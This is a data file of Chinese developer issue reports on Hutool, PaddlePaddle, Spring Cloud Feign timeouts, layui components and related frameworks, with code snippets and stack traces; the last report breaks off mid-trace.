RuntimeUtil 执行 windows 命令报错,"JDK版本： openjdk_8_201 hutool版本： 5.6.5 OS： Windows 10 我想去某个目录下，打开一个应用，比如打开 Edge 浏览器： C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe 但是报错了： 堆栈信息 <ol start=""3"">   <code>: public static void main(String[] args) { String[] cmds1 = { ""cd "", ""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" }; String[] cmds2 = { ""cd C:\\Program Files (x86)\\Microsoft\\Edge\\Application"", ""msedge.exe"" }; RuntimeUtil.exec(cmds1); // 报错 RuntimeUtil.execForLines(cmds1); // 报错 RuntimeUtil.exec(cmds2); // 报错 RuntimeUtil.execForLines(cmds2); // 报错 } public static void main(String[] args) { RuntimeUtil.exec(""cd C:\\Program Files (x86)"")； // 报错 RuntimeUtil.execForLines(""cd C:\\Program Files (x86)"")； // 报错 RuntimeUtil.execForStr(""cd C:\\Program Files (x86)"")； // 报错 } SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"". SLF4J: Defaulting to no-operation (NOP) logger implementation SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details. Exception in thread ""main"" cn.hutool.core.io.IORuntimeException: IOException: Cannot run program ""cd"": CreateProcess error=2, 系统找不到指定的文件。 at cn.hutool.core.util.RuntimeUtil.exec(RuntimeUtil.java:94) at cn.hutool.core.util.RuntimeUtil.execForStr(RuntimeUtil.java:42) at cn.hutool.core.util.RuntimeUtil.execForStr(RuntimeUtil.java:29) Caused by: java.io.IOException: Cannot run program ""cd"": CreateProcess error=2, 系统找不到指定的文件。 at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048) at cn.hutool.core.util.RuntimeUtil.exec(RuntimeUtil.java:92) ... 3 more Caused by: java.io.IOException: CreateProcess error=2, 系统找不到指定的文件。 at java.lang.ProcessImpl.create(Native Method) at java.lang.ProcessImpl.&lt;init&gt;(ProcessImpl.java:444) at java.lang.ProcessImpl.start(ProcessImpl.java:140) at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029) ... 4 more"
PaddlePaddle不支持对向量进行2范数归一化,"有些场景下需要对Layer的输出向量做2范数归一化，PaddlePaddle当前似乎不能直接支持此操作。 考虑间接的使用其他Layer来完成此操作： 如上是我能想到的一种做2范数归一化的方法，但还存在3个问题： 当前PaddlePaddle的 dot_mul_operator 只做了向量的element-wise product，但没有做最后的加法； 当前power_layer 只支持cpu，在gpu上没有实现。 上边的方法需要两次通过data_layer传入power_layer所需的指数，并且在计算power(0.5)之前需要给被开方的向量添加一个很小的偏移量防止出现负数，这是一个比较容易被忽略的地方。 PaddlePaddle是否可以直接支持2范数归一化，或者提供完整的 dot_product 操作来间接支持？或者是否有其它的方法可以实现2范数归一化？   <code>: squared_l2_norm = mixed_layer(inputs = dot_mul_operator(to_be_normed_vec, to_be_normed_vec)) # 开平方，square_root_power 是形如 [0.5] 的data_layer l2_norm = power_layer(inputs = [square_root_power, squared_l2_norm]) # 求倒数，reciprocal_power是形如[-1.0]的data_layer reciprocal_l2_norm = power_layer(inputs = [reciprocal_power, l2_norm]) # 给原始向量的每一位都乘以 1/2-norm normalized_vec = scaling_layer(inputs = [reciprocal_l2_norm, to_be_normed_vec])"
定时任务远程调用一个服务模块的方法，该方法会远程调用另一个服务，每次1000毫秒任务就会超时失败,"已经配置了ribbon和feign 报错信息：   <code>: 19:39:46.869 [com.alibaba.nacos.client.naming.updater] INFO c.a.n.client.naming - [processServiceJson,228] - new ips(1) service: DEFAULT_GROUP@@ynfp-job@@DEFAULT -&gt; [{""instanceId"":""172.18.0.5#9203#DEFAULT#DEFAULT_GROUP@@ynfp-job"",""ip"":""172.18.0.5"",""port"":9203,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-job"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:39:47.018 [com.alibaba.nacos.client.naming.updater] INFO c.a.n.client.naming - [processServiceJson,267] - current ips:(1) service: DEFAULT_GROUP@@ynfp-job@@DEFAULT -&gt; [{""instanceId"":""172.18.0.5#9203#DEFAULT#DEFAULT_GROUP@@ynfp-job"",""ip"":""172.18.0.5"",""port"":9203,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-job"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:39:47.791 [Quartz Scheduler [RuoyiScheduler]] INFO o.q.c.QuartzScheduler - [start,547] - Scheduler RuoyiScheduler_$_9c76878461371621251570015 started. 19:40:00.413 [RuoyiScheduler_Worker-1] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-bussiness.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 19:40:00.439 [RuoyiScheduler_Worker-1] INFO c.n.l.BaseLoadBalancer - [initWithConfig,197] - Client: ynfp-bussiness instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=ynfp-bussiness,current list of Servers=[],Load balancer stats=Zone stats: {},Server stats: []}ServerList:null 19:40:00.448 [RuoyiScheduler_Worker-1] INFO c.n.l.DynamicServerListLoadBalancer - [enableAndInitLearnNewServersFeature,222] - Using serverListUpdater PollingServerListUpdater 19:40:00.456 [RuoyiScheduler_Worker-1] INFO c.a.n.client.naming - [processServiceJson,228] - new ips(1) service: DEFAULT_GROUP@@ynfp-bussiness -&gt; [{""instanceId"":""172.18.0.4#9205#DEFAULT#DEFAULT_GROUP@@ynfp-bussiness"",""ip"":""172.18.0.4"",""port"":9205,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-bussiness"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:40:00.457 [RuoyiScheduler_Worker-1] INFO c.a.n.client.naming - [processServiceJson,267] - current ips:(1) service: DEFAULT_GROUP@@ynfp-bussiness -&gt; [{""instanceId"":""172.18.0.4#9205#DEFAULT#DEFAULT_GROUP@@ynfp-bussiness"",""ip"":""172.18.0.4"",""port"":9205,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-bussiness"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:40:00.471 [RuoyiScheduler_Worker-1] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-bussiness.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 19:40:00.474 [RuoyiScheduler_Worker-1] INFO c.n.l.DynamicServerListLoadBalancer - [restOfInit,150] - DynamicServerListLoadBalancer for client ynfp-bussiness initialized: DynamicServerListLoadBalancer:{NFLoadBalancer:name=ynfp-bussiness,current list of Servers=[172.18.0.4:9205],Load balancer stats=Zone stats: {unknown=[Zone:unknown; Instance count:1; Active connections count: 0; Circuit breaker tripped count: 0; Active connections per server: 0.0;] },Server stats: [[Server:172.18.0.4:9205; Zone:UNKNOWN; Total Requests:0; Successive connection failure:0; Total blackout seconds:0; Last connection made:Thu Jan 01 08:00:00 CST 1970; First connection made: Thu Jan 01 08:00:00 CST 1970; Active Connections:0; total failure count in last (1000) msecs:0; average resp time:0.0; 90 percentile resp time:0.0; 95 percentile resp time:0.0; min resp time:0.0; max resp time:0.0; stddev resp time:0.0] ]}ServerList:com.alibaba.cloud.nacos.ribbon.NacosServerList@7c1ea7f2 .454 [PollingServerListUpdater-0] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-bussiness.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 19:40:01.606 [RuoyiScheduler_Worker-4] ERROR c.a.j.u.AbstractQuartzJob - [execute,43] - 任务执行异常 - ： java.lang.reflect.InvocationTargetException: null at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.aisino.job.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:53) at com.aisino.job.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:31) at com.aisino.job.util.QuartzJobExecution.doExecute(QuartzJobExecution.java:15) at com.aisino.job.util.AbstractQuartzJob.execute(AbstractQuartzJob.java:39) at org.quartz.core.JobRunShell.run(JobRunShell.java:202) at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:573) Caused by: feign.RetryableException: Read timed out executing POST http://ynfp-bussiness/bizInvoiceInfo/issueFail at feign.FeignException.errorExecuting(FeignException.java:249) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129) at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) at feign.ReflectiveFeign$FeignInvocationHandler.invoke(ReflectiveFeign.java:100) at com.sun.proxy.$Proxy150.refreshIssueFail(Unknown Source) at com.aisino.job.task.RyTask.remoteIssueFailService(RyTask.java:60) ... 10 common frames omitted Caused by: java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) at java.net.SocketInputStream.read(SocketInputStream.java:171) at java.net.SocketInputStream.read(SocketInputStream.java:141) at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) at java.io.BufferedInputStream.read(BufferedInputStream.java:345) at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735) at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678) at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1593) at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1498) at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) at feign.Client$Default.convertResponse(Client.java:108) at feign.Client$Default.execute(Client.java:104) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:92) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:55) at com.netflix.client.AbstractLoadBalancerAwareClient$1.call(AbstractLoadBalancerAwareClient.java:104) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:303) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:287) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:231) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:228) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.drain(OnSubscribeConcatMap.java:286) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.onNext(OnSubscribeConcatMap.java:144) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:185) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:180) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:94) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:42) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber$1.call(OperatorRetryWithPredicate.java:127) at rx.internal.schedulers.TrampolineScheduler$InnerCurrentThreadScheduler.enqueue(TrampolineScheduler.java:73) at rx.internal.schedulers.TrampolineScheduler$InnerCurrentThreadScheduler.schedule(TrampolineScheduler.java:52) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber.onNext(OperatorRetryWithPredicate.java:79) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber.onNext(OperatorRetryWithPredicate.java:45) at rx.internal.util.ScalarSynchronousObservable$WeakSingleProducer.request(ScalarSynchronousObservable.java:276) at rx.Subscriber.setProducer(Subscriber.java:209) at rx.internal.util.ScalarSynchronousObservable$JustOnSubscribe.call(ScalarSynchronousObservable.java:138) at rx.internal.util.ScalarSynchronousObservable$JustOnSubscribe.call(ScalarSynchronousObservable.java:129) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.Observable.subscribe(Observable.java:10423) at rx.Observable.subscribe(Observable.java:10390) at rx.observables.BlockingObservable.blockForSingle(BlockingObservable.java:443) at rx.observables.BlockingObservable.single(BlockingObservable.java:340) at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:112) at org.springframework.cloud.openfeign.ribbon.LoadBalancerFeignClient.execute(LoadBalancerFeignClient.java:83) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119) ... 14 common frames omitted 19:40:01.609 [RuoyiScheduler_Worker-3] ERROR c.a.j.u.AbstractQuartzJob - [execute,43] - 任务执行异常 - ： java.lang.reflect.InvocationTargetException: null at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.aisino.job.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:53) at com.aisino.job.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:31) at com.aisino.job.util.QuartzDisallowConcurrentExecution.doExecute(QuartzDisallowConcurrentExecution.java:17) at com.aisino.job.util.AbstractQuartzJob.execute(AbstractQuartzJob.java:39) at org.quartz.core.JobRunShell.run(JobRunShell.java:202) at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:573) Caused by: feign.RetryableException: Read timed out executing POST http://ynfp-bussiness/bizInvoiceInfo/refreshInvalid at feign.FeignException.errorExecuting(FeignException.java:249) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129) at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) at feign.ReflectiveFeign$FeignInvocationHandler.invoke(ReflectiveFeign.java:100) at com.sun.proxy.$Proxy149.refreshInvalid(Unknown Source) at com.aisino.job.task.RyTask.remoteInvalidService(RyTask.java:57) ... 10 common frames omitted Caused by: java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) at java.net.SocketInputStream.read(SocketInputStream.java:171) at java.net.SocketInputStream.read(SocketInputStream.java:141) at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) at java.io.BufferedInputStream.read(BufferedInputStream.java:345) at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735) at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678) at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1593) at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1498) at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) at feign.Client$Default.convertResponse(Client.java:108) at feign.Client$Default.execute(Client.java:104) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:92) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:55) at com.netflix.client.AbstractLoadBalancerAwareClient$1.call(AbstractLoadBalancerAwareClient.java:104) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:303) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:287) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:231) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:228) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.drain(OnSubscribeConcatMap.java:286) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.onNext(OnSubscribeConcatMap.java:144) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:185) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:180) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:94) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:42) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber$1.call(OperatorRetryWithPredicate.java:127) at rx.internal.schedulers.TrampolineScheduler$InnerCurrentThreadScheduler.enqueue(TrampolineScheduler.java:73) at rx.internal.schedulers.TrampolineScheduler$InnerCurrentThreadScheduler.schedule(TrampolineScheduler.java:52) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber.onNext(OperatorRetryWithPredicate.java:79) at rx.internal.operators.OperatorRetryWithPredicate$SourceSubscriber.onNext(OperatorRetryWithPredicate.java:45) at rx.internal.util.ScalarSynchronousObservable$WeakSingleProducer.request(ScalarSynchronousObservable.java:276) at rx.Subscriber.setProducer(Subscriber.java:209) at rx.internal.util.ScalarSynchronousObservable$JustOnSubscribe.call(ScalarSynchronousObservable.java:138) at rx.internal.util.ScalarSynchronousObservable$JustOnSubscribe.call(ScalarSynchronousObservable.java:129) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.Observable.subscribe(Observable.java:10423) at rx.Observable.subscribe(Observable.java:10390) at rx.observables.BlockingObservable.blockForSingle(BlockingObservable.java:443) at rx.observables.BlockingObservable.single(BlockingObservable.java:340) at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:112) at org.springframework.cloud.openfeign.ribbon.LoadBalancerFeignClient.execute(LoadBalancerFeignClient.java:83) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119) ... 14 common frames omitted 19:40:32.005 [http-nio-9203-exec-2] INFO o.a.c.c.C.[.[.[/] - [log,173] - Initializing Spring DispatcherServlet 'dispatcherServlet' INFO: Sentinel log output type is: file INFO: Sentinel log charset is: utf-8 INFO: Sentinel log base directory is: /root/logs/csp/ INFO: Sentinel log name use pid is: false 19:40:40.258 [task-1] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-system.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 40:40.262 [task-1] INFO c.n.l.BaseLoadBalancer - [initWithConfig,197] - Client: ynfp-system instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=ynfp-system,current list of Servers=[],Load balancer stats=Zone stats: {},Server stats: []}ServerList:null 19:40:40.269 [task-1] INFO c.n.l.DynamicServerListLoadBalancer - [enableAndInitLearnNewServersFeature,222] - Using serverListUpdater PollingServerListUpdater 19:40:40.277 [task-1] INFO c.a.n.client.naming - [processServiceJson,228] - new ips(1) service: DEFAULT_GROUP@@ynfp-system -&gt; [{""instanceId"":""172.18.0.2#9201#DEFAULT#DEFAULT_GROUP@@ynfp-system"",""ip"":""172.18.0.2"",""port"":9201,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-system"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:40:40.278 [task-1] INFO c.a.n.client.naming - [processServiceJson,267] - current ips:(1) service: DEFAULT_GROUP@@ynfp-system -&gt; [{""instanceId"":""172.18.0.2#9201#DEFAULT#DEFAULT_GROUP@@ynfp-system"",""ip"":""172.18.0.2"",""port"":9201,""weight"":1.0,""healthy"":true,""enabled"":true,""ephemeral"":true,""clusterName"":""DEFAULT"",""serviceName"":""DEFAULT_GROUP@@ynfp-system"",""metadata"":{""preserved.register.source"":""SPRING_CLOUD""},""ipDeleteTimeout"":30000,""instanceHeartBeatInterval"":5000,""instanceHeartBeatTimeOut"":15000}] 19:40:40.280 [task-1] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-system.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 19:40:40.282 [task-1] INFO c.n.l.DynamicServerListLoadBalancer - [restOfInit,150] - DynamicServerListLoadBalancer for client ynfp-system initialized: DynamicServerListLoadBalancer:{NFLoadBalancer:name=ynfp-system,current list of Servers=[172.18.0.2:9201],Load balancer stats=Zone stats: {unknown=[Zone:unknown; Instance count:1; Active connections count: 0; Circuit breaker tripped count: 0; Active connections per server: 0.0;] },Server stats: [[Server:172.18.0.2:9201; Zone:UNKNOWN; Total Requests:0; Successive connection failure:0; Total blackout seconds:0; Last connection made:Thu Jan 01 08:00:00 CST 1970; First connection made: Thu Jan 01 08:00:00 CST 1970; Active Connections:0; total failure count in last (1000) msecs:0; average resp time:0.0; 90 percentile resp time:0.0; 95 percentile resp time:0.0; min resp time:0.0; max resp time:0.0; stddev resp time:0.0] ]}ServerList:com.alibaba.cloud.nacos.ribbon.NacosServerList@33dd4ad4 19:40:41.271 [PollingServerListUpdater-0] INFO c.n.c.ChainedDynamicProperty - [checkAndFlip,115] - Flipping property: ynfp-system.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 19:41:01.110 [RuoyiScheduler_Worker-7] ERROR c.a.j.u.AbstractQuartzJob - [execute,43] - 任务执行异常 - ： java.lang.reflect.InvocationTargetException: null"
选项卡组件lay-tab里的lay-tab-item是否可以加一个隐藏属性,"您好,选项卡项目中没有用到动态添加,但是业务上有时会隐藏某个选项卡, 请问lay-tab-item有没有隐藏属性   <code>: &lt;lay-tab type=""brief"" v-model=""current2""&gt; &lt;lay-tab-item title=""选项一"" id=""1""&gt;&lt;div style=""padding:20px""&gt;选项一&lt;/div&gt;&lt;/lay-tab-item&gt; &lt;lay-tab-item title=""选项二"" id=""2""&gt;&lt;div style=""padding:20px""&gt;选项二&lt;/div&gt;&lt;/lay-tab-item&gt; &lt;/lay-tab&gt;"
关于第一部分第6小节的改进,"你好, 我阅读了第六小节, 发现了一些小小的问题: 关于标题 根据编程文件的描述: 我认为应该改为. 而且根据定义, 文件显然不符合编程文件的定义, 我认为应该适当斟酌. 关于一些语言的分类 文件被分到了两个分类下, 而并没有给出合理的定义, 根据 bat, sh, sql以及vbs的作用, 我们可以下定义: (很显然, 编程文件的很多文件类型可以归为脚本文件. 所以, 我建议删除脚本文件的分类, 归为程序文件   <code>: 编程文件 编程文件主要依赖于对应的编程语言，是一个开源项目中占比最多的主要文件。 程序文件 *.exe *.py 脚本语言 由操作系统或编程语言解释器读取并运行的文件"
数据后面的编辑改成详情,"单条数据的后面的两个按钮,编辑改成详情,页面样式可以改edit.html页面,不要确定按钮在哪改,onclick的方法改成detail,不弹出页面了,其他没改,浏览器报这样的错   <code>: Uncaught TypeError: Cannot read properties of undefined (reading 'replace') at Object.detailUrl (ry-ui.js?v=4.7.0:1051) at Object.detail (ry-ui.js?v=4.7.0:1028) at HTMLAnchorElement.onclick (ziliaoshangbao:1)"
HttpUtil工具类toParams方法增加选择是否转义参数,"JDK版本： openjdk_8_201 hutool版本： 5.7.12 目前版本该方法不提供选择 默认自动转义 希望增加选择参数   <code>: Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""name"",""张三""); map.put(""age"",""18""); System.out.println(HttpUtil.toParams(map)); //name=%E5%BC%A0%E4%B8%89&amp;age=18 Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""name"",""张三""); map.put(""age"",""18""); System.out.println(HttpUtil.toParams(map,false)); //name=张三&amp;age=18"
file_manager/pfsclient design doc description error,url : https://github.com/PaddlePaddle/Paddle/tree/develop/doc/design/file_manager#pfsclient the link does not exist   <code>: 所以用户需要首先在cloud.paddlepaddle.org上注册一下 cloud.paddlepaddle.org
bug发现：laydate 设置isInitValuew为true  datetime类型点击清空总是会重置当前值   （准备修改源码解决）,"代码： 表现现象：laydate 点击清空按钮无法清空datetime的input 经过研究源码发现 这段代码导致 laydate 的datetime的清空完毕后又重新赋值了 暂时解决办法 在Class.prototype.setValue 函数中进行修改如下 试验结果 datetime清空按钮正常 希望贤大大早日修复此bug   <code>: laydate.render({ elem: ""#test19"" , trigger: 'click' , range: true , type: 'datetime' , value: ""2021-08-11 00:00:00 - 2021-08-11 23:59:59"" , isInitValue: true, }); //默认赋值 if(options.value &amp;&amp; options.isInitValue){ //静态展现则不作默认赋值 if(options.position === 'static') return that; value = value || ''; options.value = value;（增加这段代码）"
MeFuncPhaseManager::genMempool拼写错误,这个flag应该是genMeMpl，用来判断是不是产生ME的mpl文件，类似的函数也需要更正。   <code>: bool GetGenMempool() { return genMempool; } void SetGenMempool(bool pl) { genMempool = pl; }
用客户端模式获取的token访问接口报错,pig版本: 3.5.1   <code>: 2022-07-05 18:56:51.150 ERROR 3320 --- [ XNIO-1 task-1] a.c.s.c.PigCustomOpaqueTokenIntrospector : 资源服务器 introspect Token error null 2022-07-05 18:56:51.150 DEBUG 3320 --- [ XNIO-1 task-1] w.c.HttpSessionSecurityContextRepository : Did not store empty SecurityContext 2022-07-05 18:56:51.150 DEBUG 3320 --- [ XNIO-1 task-1] s.s.w.c.SecurityContextPersistenceFilter : Cleared SecurityContextHolder to complete request 2022-07-05 18:56:51.151 DEBUG 3320 --- [ XNIO-1 task-1] io.undertow.request.error-response : Setting error code 500 for exchange HttpServerExchange{ GET /page} java.lang.RuntimeException: null at io.undertow.server.HttpServerExchange.setStatusCode(HttpServerExchange.java:1484) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.spec.HttpServletResponseImpl.setStatus(HttpServletResponseImpl.java:290) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:107) [spring-boot-actuator-2.7.1.jar:2.7.1] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.21.jar:5.3.21] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.3.21.jar:5.3.21] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.21.jar:5.3.21] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at 